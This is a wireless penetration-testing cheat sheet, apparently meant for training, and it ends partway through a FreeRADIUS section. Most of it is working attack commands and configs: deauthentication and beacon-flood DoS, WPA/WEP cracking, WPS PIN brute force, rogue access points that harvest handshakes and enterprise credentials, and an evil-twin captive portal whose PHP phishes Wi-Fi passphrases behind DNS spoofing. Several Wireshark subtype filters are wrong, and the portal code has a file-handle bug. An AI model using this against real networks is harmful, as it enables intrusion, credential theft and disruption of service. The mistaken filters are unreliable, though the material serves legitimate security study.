# Wireless Penetration Testing — Complete Cheat Sheet

---

## 1. Wireless Interface Setup & Monitor Mode

### airmon-ng

```bash
# List wireless interfaces, drivers, chipsets
sudo airmon-ng

# Check for interfering processes (NetworkManager, wpa_supplicant, dhclient)
sudo airmon-ng check

# Kill interfering processes gracefully
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Enable monitor mode on a specific channel
sudo airmon-ng start wlan0 6

# Disable monitor mode
sudo airmon-ng stop wlan0mon

# Verbose output (kernel info, VM detection, driver source)
sudo airmon-ng --verbose

# Debug output (system commands, bus info)
sudo airmon-ng --debug
```

### iw

```bash
# List all wireless capabilities (modes, bands, frequencies, MCS rates)
sudo iw list

# Show interface info
sudo iw dev wlan0 info

# Scan for APs
sudo iw dev wlan0 scan

# Scan and filter SSIDs
sudo iw dev wlan0 scan | grep SSID

# Scan and show SSID + channel
sudo iw dev wlan0 scan | egrep "DS Parameter set|SSID:"

# Create monitor mode interface
sudo iw dev wlan0 interface add wlan0mon type monitor
sudo ip link set wlan0mon up

# Delete monitor mode interface
sudo iw dev wlan0mon interface del

# Set channel
sudo iw dev wlan0mon set channel 6

# Get interface info (channel, type, txpower)
sudo iw dev wlan0mon info
```

### iwconfig (legacy)

```bash
# Set monitor mode
sudo iwconfig wlan0 mode monitor

# Set channel
sudo iwconfig wlan0 channel 6

# Show interface info
sudo iwconfig wlan0mon
```

### iwlist (legacy)

```bash
# List available frequencies/channels
sudo iwlist wlan0 frequency

# Scan for APs
sudo iwlist wlan0 scan
```

### ip / ifconfig

```bash
# Bring interface up/down
sudo ip link set wlan0 up
sudo ip link set wlan0 down

# Assign IP address
sudo ip addr add 192.168.1.1/24 dev wlan0

# Show IP addresses
ip addr show wlan0

# Show link status
ip link show wlan0
```

### rfkill

```bash
# List all radios (Wi-Fi, Bluetooth, etc.)
sudo rfkill list

# Block a specific radio (soft block)
sudo rfkill block 1

# Unblock a specific radio
sudo rfkill unblock 1

# Block all radios
sudo rfkill block all

# Unblock all radios
sudo rfkill unblock all

# List specific radio
sudo rfkill list 1
```

---

## 2. Chipset & Driver Identification

### lsusb

```bash
# List USB devices
lsusb

# Verbose USB device info (vendor ID, product ID, chipset)
sudo lsusb -vv

# Filter for wireless adapters
lsusb | grep -i wireless
```

### lspci

```bash
# List PCI devices
lspci

# Numeric IDs (vendor:device)
lspci -n

# Verbose PCI info
lspci -vv
```

### dmesg

```bash
# Show kernel messages (driver loading, errors, firmware)
sudo dmesg

# Filter for wireless-related messages
sudo dmesg | egrep "ieee80211|mac80211|cfg80211|wifi|wireless"

# Follow kernel messages (plug device, watch output)
sudo dmesg -w
```

### lsmod

```bash
# List loaded kernel modules
lsmod

# Filter for wireless modules
lsmod | grep -i "ath\|rtl\|iwl\|brcm\|mt76"

# Show module dependencies
lsmod | grep ath9k
```

### modinfo

```bash
# Show driver info (filename, firmware, dependencies, parameters)
sudo modinfo ath9k_htc

# Show driver parameters only
sudo modinfo ath9k_htc | grep parm
```

### modprobe / insmod / rmmod

```bash
# Load module with parameters
sudo modprobe ath9k_htc blink=0

# Load module from specific path
sudo insmod /path/to/driver.ko

# Remove module (must remove dependents first)
sudo rmmod ath9k_htc ath9k_common ath9k_hw ath

# Check module params before loading
sudo modinfo ath9k_htc
```

### FCC ID Lookup

```bash
# Find FCC ID on device label
# Search at fcc.gov/oet/ea/fccid
# Browse internal photos to identify chipset
# Often shows chipset manufacturer and model number
```

### Windows Driver Extraction

```bash
# Use UniExtract2 to unpack .exe/.msi driver packages
# Inspect .inf file (UTF-16) for supported IDs
# Filenames (.cat, .inf, .sys) may indicate chipset codename
```

### DeviWiki / WikiDevi

```bash
# Search: "<card model> wikidevi"
# Example: https://deviwiki.com/wiki/ALFA_Network_AWUS036AC
# Shows chipset (RTL8812AU), USB IDs (0bda:8812), Linux driver
```

---

## 3. Regulatory Domain & RF Control

### iw reg

```bash
# Get current regulatory domain
sudo iw reg get

# Set regulatory domain (US, GB, JP, etc.)
sudo iw reg set US

# Show per-phy regulatory domain
sudo iw reg get | grep -A5 "phy#"
```

### CRDA Configuration

```bash
# Persist regulatory domain across reboots
sudo nano /etc/default/crda
# Set REGDOMAIN=US

# Verify after reboot
sudo iw reg get
```

### Channel/ Frequency Reference

```bash
# 2.4 GHz: channels 1-14, 20 MHz each, only 1/6/11 non-overlapping
# 5 GHz: channels 36-165, 20/40/80/160 MHz
# 6 GHz: channels 1-233 (Wi-Fi 6E)
# 60 GHz: channels 1-6, 2.16 GHz each (802.11ad/WiGig)

# Center frequencies (2.4 GHz):
# Ch 1: 2412 MHz, Ch 6: 2437 MHz, Ch 11: 2462 MHz, Ch 14: 2484 MHz

# HT40+ (primary + 4): Ch 1+5, 2+6, 3+7, 4+8, 5+9, 6+10, 7+11
# HT40- (primary - 4): Ch 5-1, 6-2, 7-3, 8-4, 9-5, 10-6, 11-7
```

---

## 4. Reconnaissance & Scanning

### airodump-ng

```bash
# Basic scan (channel hopping)
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng -c 6 wlan0mon

# Scan specific channel, write to file
sudo airodump-ng -c 6 -w capture wlan0mon

# Target specific BSSID
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 wlan0mon

# Filter by ESSID
sudo airodump-ng --essid "TargetNet" -c 6 wlan0mon

# Show WPS info
sudo airodump-ng --wps wlan0mon

# Output formats (csv, pcap, kismet, netxml, logcsv)
sudo airodump-ng --output-format csv,pcap wlan0mon

# Show only 5 GHz
sudo airodump-ng --band a wlan0mon

# Show both bands
sudo airodump-ng --band abg wlan0mon

# Interactive keys:
#   a = cycle display (APs+stations, APs only, stations only)
#   s = cycle sort (beacons, data, rate, channel, etc.)
#   i = invert sort
#   d = reset sort
#   m = cycle colors for selected AP
#   A = toggle scrolling
#   J/L = up/down when scrolling
#   T = freeze display
#   C+c = quit
```

### wash

```bash
# Scan for WPS-enabled APs (2.4 GHz)
sudo wash -i wlan0mon

# Scan 5 GHz
sudo wash -i wlan0mon -5

# Show all (including locked)
sudo wash -i wlan0mon -a

# Show only locked
sudo wash -i wlan0mon -l

# Ignore Frame Check Sequence errors
sudo wash -i wlan0mon -n
```

### Kismet (scanning)

```bash
# Start Kismet on wlan0 (auto monitor mode)
sudo kismet -c wlan0

# No ncurses (full output, scrollable)
sudo kismet -c wlan0 --no-ncurses

# Limit channels
sudo kismet -c wlan0:channels="1,6,11"

# Daemonize
sudo kismet --daemonize

# Run as service
sudo systemctl start kismet
```

---

## 5. Packet Capture & Analysis

### tcpdump

```bash
# Capture on monitor interface
sudo tcpdump -i wlan0mon

# Write raw packets to stdout (for piping)
sudo tcpdump -i wlan0mon -w - -U

# Capture with link type
sudo tcpdump -i wlan0mon -w capture.pcap

# Capture specific BSSID (filter on all address fields)
sudo tcpdump -i wlan0mon 'wlan addr1 00:11:22:33:44:55 or wlan addr2 00:11:22:33:44:55'

# Exclude beacons
sudo tcpdump -i wlan0mon 'not subtype beacon'

# Exclude control frames
sudo tcpdump -i wlan0mon 'not type ctl'

# Show 802.11 headers
sudo tcpdump -i wlan0mon -e -s 0 -vvv
```

### Wireshark — Display Filters

```
# 802.11 frame types
wlan.fc.type == 0      # Management
wlan.fc.type == 1      # Control
wlan.fc.type == 2      # Data
wlan.fc.type == 3      # Extension

# Management subtypes
wlan.fc.type_subtype == 0x08   # Beacon
wlan.fc.type_subtype == 0x04   # Probe Request
wlan.fc.type_subtype == 0x05   # Probe Response
wlan.fc.type_subtype == 0x0b   # Authentication
wlan.fc.type_subtype == 0x00   # Association Request
wlan.fc.type_subtype == 0x01   # Association Response
wlan.fc.type_subtype == 0x0c   # Deauthentication
wlan.fc.type_subtype == 0x0a   # Disassociation

# Control subtypes
wlan.fc.type_subtype == 0x0d   # ACK
wlan.fc.type_subtype == 0x0b   # RTS
wlan.fc.type_subtype == 0x0c   # CTS

# Data subtypes
wlan.fc.type_subtype == 0x00   # Data
wlan.fc.type_subtype == 0x08   # QoS Data
wlan.fc.type_subtype == 0x04   # Null

# Specific fields
wlan.bssid == 00:11:22:33:44:55
wlan.ssid == "TargetNet"
wlan.fc.protected == 1          # Encrypted frames
wlan.fc.retry == 1              # Retransmissions
wlan.fc.ds == 0x01              # ToDS
wlan.fc.ds == 0x02              # FromDS
wlan.fc.ds == 0x03              # WDS
eapol                            # EAPoL frames
wlan.fc.type_subtype in {0x0 0x1 0xb}  # Assoc req/resp + auth

# Protocol filters
eapol
eap
tls
http
dns
dhcp
```

### Wireshark — Capture Filters

```
# Exclude beacons
not subtype beacon

# Exclude control frames
not type ctl

# Exclude probe requests/responses
not subtype probe-req and not subtype probe-resp

# Specific device (all 4 address fields)
(wlan addr1 AA:BB:CC:DD:EE:FF) or (wlan addr2 AA:BB:CC:DD:EE:FF) or (wlan addr3 AA:BB:CC:DD:EE:FF) or (wlan addr4 AA:BB:CC:DD:EE:FF)

# Combined filter
((wlan addr1 AA:BB:CC:DD:EE:FF) or (wlan addr2 AA:BB:CC:DD:EE:FF)) and not subtype beacon and not type ctl

# Beacons only
subtype beacon

# Probes
subtype probe-req or subtype probe-resp

# Association
subtype assoc-req or subtype assoc-resp or subtype reassoc-req or subtype reassoc-resp

# Data
type data
```

### Wireshark — Command Line

```bash
# List interfaces
wireshark -D

# Capture on wlan0mon, start immediately
sudo wireshark -i wlan0mon -k

# Monitor mode + immediate capture
sudo wireshark -i wlan0 -I -k

# Capture with filter
sudo wireshark -i wlan0mon -k -f "not subtype beacon"

# Snaplen (capture first 60 bytes)
sudo wireshark -i wlan0mon -k -s 60

# Open capture file
wireshark capture.pcap

# Pipe tcpdump to Wireshark (unnamed pipe)
sudo tcpdump -U -w - -i wlan0mon | wireshark -k -i -

# Named pipe
mkfifo /tmp/named_pipe
sudo wireshark -k -i /tmp/named_pipe
sudo tcpdump -U -w - -i wlan0mon > /tmp/named_pipe

# Remote capture over SSH (pipe)
ssh root@10.0.0.1 "sudo tcpdump -U -w - -i wlan0mon" | wireshark -k -i -

# Remote capture via SSHdump (GUI)
# Capture > Options > SSH remote capture
# Set server, port, auth, remote interface, capture command
```

### tshark

```bash
# Capture to file
sudo tshark -w - -i wlan0mon

# Convert PcapNg to Pcap
tshark -F pcap -r input.pcapng -w output.pcap

# Display filter
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x08"

# Read capture
tshark -r capture.pcap
```

### dumpcap

```bash
# Capture to stdout (PCAP format)
sudo dumpcap -w - -P -i wlan0mon

# Capture to file
sudo dumpcap -i wlan0mon -w capture.pcap
```

### Wireshark Decryption

```
# WEP key
# Preferences > Protocols > IEEE 802.11 > Edit decryption keys
# Key type: wep
# Key: hexadecimal (e.g., 1A:2B:3C:4D:5E)
# Key ID: 0-3

# WPA-PSK (passphrase + SSID)
# Key type: wpa-pwd
# Key: passphrase:SSID (e.g., password123:MyNetwork)

# WPA-PSK (PMK in hex)
# Key type: wpa-psk
# Key: PMK hex (64 hex chars)

# wpa_passphrase to generate PMK
wpa_passphrase MyNetwork "password123"
# Copy psk= value to Wireshark as wpa-psk key
```

---

## 6. WPA/WPA2 Handshake Capture & Cracking

### airodump-ng (capture)

```bash
# Start capture on target channel, write to file
sudo airodump-ng -c 6 -w capture --bssid 00:11:22:33:44:55 wlan0mon

# Filter by ESSID
sudo airodump-ng -c 6 -w capture --essid "TargetNet" --bssid 00:11:22:33:44:55 wlan0mon

# WPA handshake captured message appears in top line:
# [ WPA handshake: 00:11:22:33:44:55 ]
```

### aireplay-ng (deauth to force handshake)

```bash
# Deauth one client
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c 00:AA:BB:CC:DD:EE wlan0mon

# Deauth all clients (broadcast)
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 wlan0mon

# Continuous deauth (every 1 second)
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon

# Injection test
sudo aireplay-ng -9 wlan0mon

# Injection test against specific AP
sudo aireplay-ng -9 -e "TargetNet" -a 00:11:22:33:44:55 wlan0mon

# Card-to-card injection test
sudo aireplay-ng -9 -i wlan1mon wlan0mon
```

### aircrack-ng

```bash
# Crack with wordlist
aircrack-ng -w /usr/share/john/password.lst -e "TargetNet" -b 00:11:22:33:44:55 capture-01.cap

# Without ESSID/BSSID (prompts to select)
aircrack-ng -w wordlist.txt capture-01.cap

# Benchmark CPU
aircrack-ng -S

# Use airolib-ng database
aircrack-ng -r database.sqlite capture-01.cap

# Pipe from John the Ripper
john --wordlist=password.lst --rules --stdout | aircrack-ng -e "TargetNet" -w - capture-01.cap

# Pipe from Crunch
crunch 11 11 -t password%%% | aircrack-ng -e "TargetNet" -w - capture-01.cap

# Pipe from RSMangler
rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e "TargetNet" -w - capture-01.cap
```

### airdecap-ng

```bash
# Decrypt WPA capture
airdecap-ng -b 00:11:22:33:44:55 -e "TargetNet" -p "password123" capture-01.cap

# Decrypt WEP capture
airdecap-ng -w 1A:2B:3C:4D:5E capture-01.cap

# Remove wireless headers from open network capture
airdecap-ng -b 00:11:22:33:44:55 opennet-01.cap

# Output file: capture-01-dec.cap
```

### airgraph-ng

```bash
# Download OUI database
mkdir support && cd support
wget http://standards-oui.ieee.org/oui.txt
cd ..

# Client to AP Relationship graph
airgraph-ng -o capr.png -i dump-01.csv -g CAPR

# Client Probe Graph
airgraph-ng -o cpg.png -i dump-01.csv -g CPG
```

### airolib-ng

```bash
# Create ESSID file
echo "TargetNet" > essid.txt

# Import ESSID into database
airolib-ng target.sqlite --import essid essid.txt

# Import password list
airolib-ng target.sqlite --import passwd /usr/share/john/password.lst

# Show database stats
airolib-ng target.sqlite --stats

# Batch compute PMKs
airolib-ng target.sqlite --batch

# Use database with aircrack-ng
aircrack-ng -r target.sqlite capture-01.cap

# Batch process (background)
airolib-ng target.sqlite --batch &

# Import multiple ESSIDs
echo "Net1" > essid1.txt
echo "Net2" > essid2.txt
airolib-ng db.sqlite --import essid essid1.txt
airolib-ng db.sqlite --import essid essid2.txt
```

### coWPAtty

```bash
# Dictionary attack
cowpatty -r capture-01.cap -d /usr/share/john/password.lst -s "TargetNet"

# Generate precomputed hashes (rainbow tables)
genpmk -f /usr/share/john/password.lst -d wifuhashes -s "TargetNet"

# Use precomputed hashes
cowpatty -r capture-01.cap -d wifuhashes -s "TargetNet"
```

### hashcat (WPA)

```bash
# Convert PCAP to hccapx (legacy 2500 mode)
/usr/lib/hashcat-utils/cap2hccapx.bin capture-01.cap output.hccapx

# Crack with hashcat (2500 mode, deprecated)
hashcat -m 2500 --deprecated-check-disable output.hccapx /usr/share/john/password.lst

# Convert to 22000 mode with hcxtools
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack with hashcat (22000 mode)
hashcat -a 0 -m 22000 hash.hc22000 /usr/share/john/password.lst

# Benchmark 22000 mode
hashcat -b -m 22000

# Benchmark 2500 mode
hashcat -b -m 2500

# List devices
hashcat -I

# Specify device
hashcat -d 1 -m 22000 hash.hc22000 wordlist.txt

# Specify device type (CPU/GPU)
hashcat -D 2 -m 22000 hash.hc22000 wordlist.txt

# Session management
hashcat --session mysession -m 22000 hash.hc22000 wordlist.txt
hashcat --session mysession --restore

# Potfile
cat ~/.hashcat/hashcat.potfile
rm ~/.hashcat/hashcat.potfile
```

### hcxtools

```bash
# Install
sudo apt install hcxtools

# Convert pcap to 22000
hcxpcapngtool -o hash.hc22000 capture.pcap

# Convert with filtering
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcap

# Show info about capture
hcxpcapngtool capture.pcap
```

---

## 7. WEP Cracking

### airodump-ng (WEP capture)

```bash
# Capture WEP IVs (write to file)
sudo airodump-ng -c 6 -w wep_capture --bssid 00:11:22:33:44:55 wlan0mon

# Write only IVs (smaller file)
sudo airodump-ng -c 6 -w wep_capture --bssid 00:11:22:33:44:55 --ivs wlan0mon
```

### aireplay-ng (WEP attacks)

```bash
# Fake authentication (associate with AP)
sudo aireplay-ng -1 0 -e "TargetNet" -a 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# Fake auth with keep-alive (every 60 sec)
sudo aireplay-ng -1 60 -e "TargetNet" -a 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# ARP request replay attack (generate IVs)
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# Interactive packet replay
sudo aireplay-ng -2 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# KoreK ChopChop attack
sudo aireplay-ng -4 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# Fragmentation attack
sudo aireplay-ng -5 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# Café-Latte attack
sudo aireplay-ng -6 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# Client-oriented fragmentation attack
sudo aireplay-ng -7 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# WPA Migration Mode attack
sudo aireplay-ng -8 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon
```

### aircrack-ng (WEP)

```bash
# Crack WEP (needs ~50k-200k IVs)
aircrack-ng wep_capture-01.cap

# Specify BSSID
aircrack-ng -b 00:11:22:33:44:55 wep_capture-01.cap

# Use PTW attack (faster, fewer IVs)
aircrack-ng -z wep_capture-01.cap

# Use KoreK attack
aircrack-ng -K wep_capture-01.cap

# Use FMS attack
aircrack-ng -f 2 wep_capture-01.cap
```

### airdecap-ng (WEP)

```bash
# Decrypt WEP capture (key in hex)
airdecap-ng -w 1A:2B:3C:4D:5E wep_capture-01.cap
```

---

## 8. WPS Attacks

### wash

```bash
# Scan for WPS APs
sudo wash -i wlan0mon

# Show locked
sudo wash -i wlan0mon -l

# Show all (including locked)
sudo wash -i wlan0mon -a

# 5 GHz
sudo wash -i wlan0mon -5
```

### reaver

```bash
# Brute force WPS PIN
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -v

# Specify channel
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -c 6 -v

# PixieWPS attack (offline PIN recovery)
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -v -K

# Try specific PIN
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -p 12345670

# Empty PIN
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -p ''

# Delay between attempts (avoid lockout)
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -d 15 -T 5

# Restore previous session
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -s session_file

# Verbose levels
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -v   # verbose
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -vv  # very verbose

# Ignore frame checksum errors
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -C

# Set MAC address
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -m 00:AA:BB:CC:DD:EE

# Use specific WPS version
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -w 2
```

### bully

```bash
# Brute force WPS PIN
sudo bully -b 00:11:22:33:44:55 wlan0mon

# PixieWPS attack
sudo bully -b 00:11:22:33:44:55 -d wlan0mon

# Verbose output
sudo bully -b 00:11:22:33:44:55 -v 4 wlan0mon

# Try specific PIN
sudo bully -b 00:11:22:33:44:55 -B -p 12345670 wlan0mon

# Specify channel
sudo bully -b 00:11:22:33:44:55 -c 6 wlan0mon
```

### pixiewps

```bash
# Standalone (values from reaver/bully output)
pixiewps -e <Enonce> -s <SNonce> -z <ES1> -a <ES2> -n <N1> -r <R1>

# Usually called automatically by reaver/bully with -K/-d
```

### Known PINs Database

```bash
# Install airgeddon
sudo apt install airgeddon

# Source known pins database
source /usr/share/airgeddon/known_pins.db

# Query by BSSID prefix (first 3 bytes, uppercase)
echo ${PINDB["0013F7"]}
```

### mdk3 / mdk4

```bash
# Authentication DoS
sudo mdk3 wlan0mon a -a 00:11:22:33:44:55

# EAPOL Start DoS
sudo mdk3 wlan0mon e -t 00:11:22:33:44:55 -n 00:AA:BB:CC:DD:EE

# EAPOL Logoff flood
sudo mdk3 wlan0mon l -t 00:11:22:33:44:55

# Deauth DoS
sudo mdk3 wlan0mon d -b blacklist.txt -c 6

# Beacon flood
sudo mdk3 wlan0mon b -f ssid_list.txt -c 6 -s 1000

# WIDS/WIPS confusion
sudo mdk3 wlan0mon w -e "TargetNet" -c 6
```

### WPS Lock Bypass

```bash
# Attack with mdk3 to crash AP (reboot releases lock)
sudo mdk3 wlan0mon a -a 00:11:22:33:44:55

# Or deauth all clients
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon
```

---

## 9. Rogue Access Points

### hostapd-mana

```bash
# Install
sudo apt install hostapd-mana

# Configuration file (basic)
cat > rogue.conf << 'EOF'
interface=wlan0
ssid=TargetNet
channel=6
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/handshakes.hccapx
EOF

# Start rogue AP
sudo hostapd-mana rogue.conf

# Capture handshakes from clients
sudo hostapd-mana Mostar-mana.conf
```

### hostapd (standard)

```bash
# Install
sudo apt install hostapd

# Configuration file (WPA2 PSK)
cat > hostapd.conf << 'EOF'
interface=wlan0
ssid=BTTF
channel=11
hw_mode=g
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=GreatScott
EOF

# Start AP
sudo hostapd hostapd.conf

# Run in background
sudo hostapd -B hostapd.conf
```

### hostapd-mana (Enterprise)

```bash
# Install
sudo apt install hostapd-mana freeradius

# Generate certificates
cd /etc/freeradius/3.0/certs
sudo nano ca.cnf     # Edit certificate_authority fields
sudo nano server.cnf  # Edit server fields
sudo rm dh
sudo make

# Create EAP user file
cat > /etc/hostapd-mana/mana.eap_user << 'EOF'
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
EOF

# Create hostapd-mana config
cat > /etc/hostapd-mana/mana.conf << 'EOF'
ssid=Playtronics
interface=wlan0
driver=nl80211
channel=1
hw_mode=g
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0
eap_user_file=/etc/hostapd-mana/mana.eap_user
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh
auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=/tmp/hostapd.credout
mana_eapsuccess=1
mana_eaptls=1
EOF

# Start
sudo hostapd-mana /etc/hostapd-mana/mana.conf

# Run in background
sudo hostapd-mana -B /etc/hostapd-mana/mana.conf
```

### Capturing Handshakes with Rogue AP

```bash
# Terminal 1: Start rogue AP (hostapd-mana)
sudo hostapd-mana Mostar-mana.conf

# Terminal 2: Deauth clients from legitimate AP
sudo airmon-ng start wlan1 6
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan1mon

# Handshakes saved to mana_wpaout file
```

### Convert and Crack

```bash
# Check format
cat mostar.hccapx

# Remove prefix (if hostapd-mana adds one)
sed 's/^\[WPA2-EAPOL HASHCAT\][[:space:]]*//' mostar.hccapx > mostar.22000

# Verify
head mostar.22000

# Crack with hashcat
hashcat -m 22000 mostar.22000 /usr/share/john/password.lst
```

---

## 10. Captive Portal Attacks

### Apache + PHP Setup

```bash
# Install
sudo apt install apache2 libapache2-mod-php

# Create portal directory
sudo mkdir -p /var/www/html/portal

# Download target website
wget -r -l2 https://www.target.com

# Copy assets
sudo cp -r ./www.target.com/assets/ /var/www/html/portal/
sudo cp -r ./www.target.com/old-site/ /var/www/html/portal/
```

### Captive Portal — index.php

```php
<!DOCTYPE html>
<html>
<head>
  <link href="assets/css/style.css" rel="stylesheet">
  <title>Target Corp - WiFi</title>
</head>
<body>
  <div class="navbar">
    <a class="navbar-brand" href="index.php">Target Corp</a>
  </div>
  <div id="headerwrap">
    <div class="row centered">
      <div class="col-lg-8 col-lg-offset-2">
        <?php
          if (isset($_GET["success"])) {
            echo '<h3>Login successful</h3>';
            echo '<h3>You may close this page</h3>';
          } else {
            if (isset($_GET["failure"])) {
              echo '<h3>Invalid network key, try again</h3><br/><br/>';
            }
        ?>
        <h3>Enter network key</h3><br/><br/>
        <form action="login_check.php" method="post">
          <input type="password" id="passphrase" name="passphrase"><br/><br/>
          <input type="submit" value="Connect"/>
        </form>
        <?php } ?>
      </div>
    </div>
  </div>
</body>
</html>
```

### Captive Portal — login_check.php

```php
<?php
$handshake_path = '/home/kali/discovery-01.cap';
$essid = 'MegaCorp One Lab';
$success_path = '/tmp/passphrase.txt';
$passphrase = $_POST['passphrase'];

if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
if ($retval == 0) {
  foreach($output as $line) {
    if (strpos($line, "KEY FOUND") !== FALSE) {
      $key_found = TRUE;
      break;
    }
  }
}

if ($key_found) {
  @rename($wordlist_path, $success_path);
  header('Location: index.php?success');
} else {
  @unlink($wordlist_file);
  header('Location: index.php?failure');
}
?>
```

### dnsmasq (DHCP + DNS Spoofing)

```bash
# Install
sudo apt install dnsmasq

# Configuration
cat > mco-dnsmasq.conf << 'EOF'
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
listen-address=192.168.87.1
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100
# DNS spoofing
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1
address=/dns.msftncsi.com/131.107.255.255
EOF

# Start
sudo dnsmasq --conf-file=mco-dnsmasq.conf

# Check syslog
sudo tail /var/log/syslog | grep dnsmasq

# Check listening ports
sudo netstat -lnp | grep dnsmasq
```

### nftables (DNS redirect)

```bash
# Install
sudo apt install nftables

# Redirect DNS to us
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```

### Apache mod_rewrite / mod_alias

```bash
# Enable modules
sudo a2enmod rewrite
sudo a2enmod alias
sudo a2enmod ssl

# Edit /etc/apache2/sites-enabled/000-default.conf
# Add inside <VirtualHost *:80>:

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

# Restart Apache
sudo systemctl restart apache2
```

### Rogue AP for Captive Portal

```bash
# hostapd config
cat > mco-hostapd.conf << 'EOF'
interface=wlan0
ssid=MegaCorp One Lab
channel=11
hw_mode=g
ieee80211n=1
EOF

# Start AP (background)
sudo hostapd -B mco-hostapd.conf

# Monitor logs
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
sudo tail -f /var/log/apache2/access.log

# Find captured passphrase
sudo find /tmp/ -iname passphrase.txt
sudo cat /tmp/systemd-private-*/tmp/passphrase.txt
```

### IP Configuration

```bash
# Assign IP to wlan0
sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
```

---

## 11. WPA Enterprise Attacks

### Reconnaissance

```bash
# Identify WPA Enterprise AP (AUTH = MGT)
sudo airodump-ng wlan0mon

# Capture authentication exchange
sudo airodump-ng -c 6 -w enterprise --bssid 00:11:22:33:44:55 wlan0mon

# Deauth to force reauthentication
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c 00:AA:BB:CC:DD:EE wlan0mon
```

### Certificate Extraction (Wireshark)

```
# Filter for certificate frames
tls.handshake.type == 11
tls.handshake.certificate

# Or filter by BSSID + eap
wlan.bssid == 00:11:22:33:44:55 && eap

# In Packet Details:
# Extensible Authentication Protocol > Transport Layer Security
# > TLSv1 Record Layer: Handshake Protocol: Certificate
# > Handshake Protocol: Certificate > Certificates > Certificate
# Right-click > Export Packet Bytes (save as .der)
```

### Certificate Conversion

```bash
# Show certificate info
openssl x509 -inform der -in cert.der -text -noout

# Convert DER to PEM
openssl x509 -inform der -in cert.der -outform pem -out cert.pem

# Check expiration
openssl x509 -in cert.pem -noout -enddate
```

### FreeRADIUS Certificate Generation

```bash
# Install
sudo apt install freeradius

# Navigate to certs directory
cd /etc/freeradius/3.0/certs

# Edit CA config
sudo nano ca.cnf
# [certificate_authority]
